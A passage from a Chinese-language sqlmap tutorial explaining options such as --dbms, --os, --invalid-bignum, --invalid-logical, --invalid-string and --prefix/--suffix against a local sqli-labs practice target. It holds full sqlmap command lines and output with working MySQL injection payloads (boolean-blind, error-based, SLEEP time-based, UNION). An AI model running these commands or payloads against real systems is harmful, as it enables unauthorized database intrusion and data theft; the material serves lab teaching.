back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[20:39:32] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:39:32 /2020-02-29/

                                                                     
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187
```

*标记也可以用于–user-agent和–proxy等参数中。

## 四、sqlmap注入参数

### 1.sqlmap强制设置DBMS

默认情况下sqlmap会自动识别探测目标web应用程序的后端数据库管理系统(DBMS)，sqlmap支持的DBMS种类有：

- MySQL
- Oracle
- PostgreSQL
- Microsoft SQL Server
- Microsoft Access
- Firebird
- SQLite
- Sybase
- SAP MaxDB
- DB2

可以通过参数来指定数据库来进行探测：
参数：
`--dbms 数据库类型`
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --dbms mysql --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:40:41 /2020-03-01/

[09:40:42] [INFO] testing connection to the target URL
[09:40:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:40:42] [INFO] testing if the target URL content is stable
[09:40:42] [INFO] target URL content is stable
[09:40:42] [INFO] testing if GET parameter 'id' is dynamic
[09:40:42] [INFO] GET parameter 'id' appears to be dynamic
[09:40:42] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[09:40:42] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[09:40:42] [INFO] testing for SQL injection on GET parameter 'id'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[09:40:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:40:51] [WARNING] reflective value(s) found and filtering out
[09:40:51] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[09:40:51] [INFO] testing 'Generic inline queries'
[09:40:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:40:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:40:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:40:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:40:52] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:40:52] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:40:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:40:52] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[09:40:52] [INFO] testing 'MySQL inline queries'
[09:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:40:52] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[09:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[09:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[09:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[09:40:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[09:40:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[09:40:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:41:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[09:41:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:41:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:41:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:41:02] [INFO] target URL appears to have 3 columns in query
[09:41:02] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7504=7504 AND 'BNEG'='BNEG

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 9479 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(9479=9479,1))),0x7171627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'XPIc'='XPIc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 8767 FROM (SELECT(SLEEP(5)))trYN) AND 'UXYA'='UXYA

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-8306' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707671,0x587572745246476f63786f6b6243456b66724b69784c66657866526f56457775726774675a787672,0x7171627871)-- -
---
[09:41:21] [INFO] the back-end DBMS is MySQL
[09:41:21] [INFO] fetching banner
[09:41:21] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[09:41:21] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 09:41:21 /2020-03-01/

                                                          
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879
```

### 2.sqlmap强制设置OS系统

默认情况下sqlmap会自动探测目标web应用程序的后端操作系统，sqlmap完全支持的OS种类Linux、Windows。
可以通过参数来指定探测的操作系统：
参数：
`--os 系统类型`
测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --dbms mysql --os windows --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . ["]     | .'| . |                                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 09:42:55 /2020-03-01/                                                                                                                      
                                                                                                                                                          
[09:42:56] [INFO] testing connection to the target URL                                                                                                    
sqlmap resumed the following injection point(s) from stored session:                                                                                      
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=1' AND 7504=7504 AND 'BNEG'='BNEG                                                                                                         
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=1' AND (SELECT 9479 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(9479=9479,1))),0x7171627871,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'XPIc'='XPIc                                                                                                             
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=1' AND (SELECT 8767 FROM (SELECT(SLEEP(5)))trYN) AND 'UXYA'='UXYA                                                                         
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-8306' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707671,0x587572745246476f63786f6b6243456b66724b69784c66657866526f56457775726774675a787672,0
x7171627871)-- -                                                                                                                                          
---                                                                                                                                                       
[09:42:56] [INFO] testing MySQL                                                                                                                           
[09:42:56] [INFO] confirming MySQL                                                                                                                        
[09:42:56] [INFO] the back-end DBMS is MySQL                                                                                                              
[09:42:56] [INFO] fetching banner                                                                                                                         
[09:42:56] [INFO] the back-end DBMS operating system is Windows                                                                                           
back-end DBMS operating system: Windows                                                                                                                   
back-end DBMS: MySQL >= 5.0.0                                                                                                                             
banner: '5.7.26'                                                                                                                                          
[09:42:56] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 09:42:56 /2020-03-01/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                            
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647
```

再次测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os linux --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:45:48 /2020-03-01/

[09:45:48] [INFO] testing connection to the target URL
[09:45:48] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:45:48] [INFO] testing if the target URL content is stable
[09:45:49] [INFO] target URL content is stable
[09:45:49] [INFO] testing if GET parameter 'id' is dynamic
[09:45:49] [INFO] GET parameter 'id' appears to be dynamic
[09:45:49] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[09:45:49] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[09:45:49] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[09:45:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:45:51] [WARNING] reflective value(s) found and filtering out
[09:45:51] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[09:45:51] [INFO] testing 'Generic inline queries'
[09:45:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:45:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:45:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:45:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:45:52] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:45:52] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:45:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:45:52] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[09:45:52] [INFO] testing 'MySQL inline queries'
[09:45:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:45:52] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[09:45:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[09:45:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[09:45:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[09:45:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[09:45:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[09:45:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:46:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[09:46:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:46:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:46:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:46:02] [INFO] target URL appears to have 3 columns in query
[09:46:03] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 8697=8697 AND 'vXiI'='vXiI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 4143 FROM(SELECT COUNT(*),CONCAT(0x71786a6271,(SELECT (ELT(4143=4143,1))),0x71767a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'vpOq'='vpOq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4595 FROM (SELECT(SLEEP(5)))gWzN) AND 'BTap'='BTap

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-6582' UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x4f4152547367744d454144444f7859484d52646f6e49564467667458597843725466574363435a6d,0x71767a7a71),NULL-- -
---
[09:46:06] [INFO] the back-end DBMS is MySQL
[09:46:06] [INFO] fetching banner
[09:46:07] [INFO] the back-end DBMS operating system is Linux
[09:46:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS operating system: Linux
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[09:46:07] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 09:46:07 /2020-03-01/

                                                                                                                                                                                                     
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283
```

### 3.Sqlmap强制设置无效值替换

#### –invalid-bignum参数

在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)；
有了参数`--invalid-bignum`，就可以强制使用大整数值来实现相同的目标(例如id=99999999)。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --invalid-bignum --banner -v 5
1
```

显示：
![--invalid-bignum](https://img-blog.csdnimg.cn/202003011301360.gif#pic_center)
可以发现，其中出现了
`Payload: id=462284' UNION ALL SELECT NULL,NULL,CONCAT(0x71706b6a71,0x676b6a4b566742436e7a6763484c4d6b6d4c6e61736141644542466a65725072454d6a6852677855,0x717a6b6a71)-- -`
即在探测时将id设为了较大的值462284。

#### –invalid-logical参数

有了参数`--invalid-logical`，就可以强制使用布尔操作来实现相同的目标(例如`id=13 and 18=19`)。
测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --invalid-logical --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:08:58 /2020-03-01/

[10:08:59] [INFO] testing connection to the target URL
[10:08:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:08:59] [INFO] testing if the target URL content is stable
[10:08:59] [INFO] target URL content is stable
[10:08:59] [INFO] testing if GET parameter 'id' is dynamic
[10:08:59] [INFO] GET parameter 'id' appears to be dynamic
[10:08:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[10:08:59] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[10:08:59] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[10:09:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:09:01] [WARNING] reflective value(s) found and filtering out
[10:09:02] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[10:09:02] [INFO] testing 'Generic inline queries'
[10:09:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:09:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:09:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:09:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:09:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:09:02] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:09:02] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:09:02] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[10:09:02] [INFO] testing 'MySQL inline queries'
[10:09:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:09:02] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[10:09:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:09:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:09:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:09:02] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:09:02] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:09:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:09:12] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[10:09:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:09:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:09:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:09:12] [INFO] target URL appears to have 3 columns in query
[10:09:12] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3467=3467 AND 'vjnx'='vjnx

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 8283 FROM(SELECT COUNT(*),CONCAT(0x716b627a71,(SELECT (ELT(8283=8283,1))),0x716b7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'whel'='whel

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7542 FROM (SELECT(SLEEP(5)))AXCz) AND 'TpNY'='TpNY

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1' AND 71 LIKE 72 UNION ALL SELECT NULL,CONCAT(0x716b627a71,0x4846764a516c586f4e7a4b5853725a43434f57454a5552516a4a494d576c494d4f61615353787549,0x716b7a7871),NULL-- -
---
[10:09:15] [INFO] the back-end DBMS is MySQL
[10:09:15] [INFO] fetching banner
[10:09:15] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[10:09:15] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 10:09:15 /2020-03-01/

                                                                                                                                                                                                   
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081
```

显然，出现了
`Payload: id=1' AND 71 LIKE 72 UNION ALL SELECT NULL,CONCAT(0x716b627a71,0x4846764a516c586f4e7a4b5853725a43434f57454a5552516a4a494d576c494d4f61615353787549,0x716b7a7871),NULL-- -`，
即`71 LIKE 72`这种逻辑错误。

#### –invalid-string参数

有了参数`--invalid-string`，就可以强制使用随机字符串来实现相同的目标(例如`id=akewmc`)。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --invalid-string --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 10:24:44 /2020-03-01/                                                                                                                      
                                                                                                                                                          
[10:24:44] [INFO] testing connection to the target URL                                                                                                    
[10:24:44] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[10:24:44] [INFO] testing if the target URL content is stable                                                                                             
[10:24:45] [INFO] target URL content is stable                                                                                                            
[10:24:45] [INFO] testing if GET parameter 'id' is dynamic                                                                                                
[10:24:45] [INFO] GET parameter 'id' appears to be dynamic                                                                                                
[10:24:45] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')                                       
[10:24:45] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks                            
[10:24:45] [INFO] testing for SQL injection on GET parameter 'id'                                                                                         
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]                                            
                                                                                                                                                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]                             
                                                                                                                                                          
[10:24:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[10:24:48] [WARNING] reflective value(s) found and filtering out                                                                                          
[10:24:48] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")                   
[10:24:48] [INFO] testing 'Generic inline queries'                                                                                                        
[10:24:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[10:24:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[10:24:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[10:24:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[10:24:49] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[10:24:49] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[10:24:49] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[10:24:49] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                    
[10:24:49] [INFO] testing 'MySQL inline queries'                                                                                                          
[10:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                                                                     
[10:24:49] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                   
[10:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                                                                               
[10:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[10:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                                                                                 
[10:24:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                        
[10:24:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'                                                                                  
[10:24:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[10:24:59] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                        
[10:24:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                  
[10:24:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found     
[10:24:59] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test                                                                                       
[10:24:59] [INFO] target URL appears to have 3 columns in query                                                                                           
[10:24:59] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                         
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y                                                                
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:                                                                   
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=1' AND 6118=6118 AND 'VaYg'='VaYg                                                                                                         
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=1' AND (SELECT 4130 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(4130=4130,1))),0x71706b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'stHh'='stHh                                                                                                             
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=1' AND (SELECT 9229 FROM (SELECT(SLEEP(5)))WerB) AND 'LqGE'='LqGE                                                                         
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=atUzqr' UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7171,0x6765636e6d4f5655424e4870554575704574706c785866526a79697964754e774c6278726a4b6872,
0x71706b7871)-- -                                                                                                                                         
---                                                                                                                                                       
[10:25:03] [INFO] the back-end DBMS is MySQL                                                                                                              
[10:25:03] [INFO] fetching banner                                                                                                                         
[10:25:03] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
back-end DBMS: MySQL >= 5.0                                                                                                                               
banner: '5.7.26'                                                                                                                                          
[10:25:03] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 10:25:03 /2020-03-01/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                   
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485
```

出现了
`Payload: id=atUzqr' UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7171,0x6765636e6d4f5655424e4870554575704574706c785866526a79697964754e774c6278726a4b6872,0x71706b7871)-- -`，
即强制使用随机字符串`atUzqr`来进行测试。

### 4.Sqlmap自定义注入负载位置

在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。
当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，下面这些选项就派上用场了：

- –prefix
  设置SQL注入Payload前缀
- –suffix
  设置SQL注入Payload后缀

```powershell
$query = "SELECT * FROM users WHERE id=('.$_GET['id'].') LIMIT 0, 1";

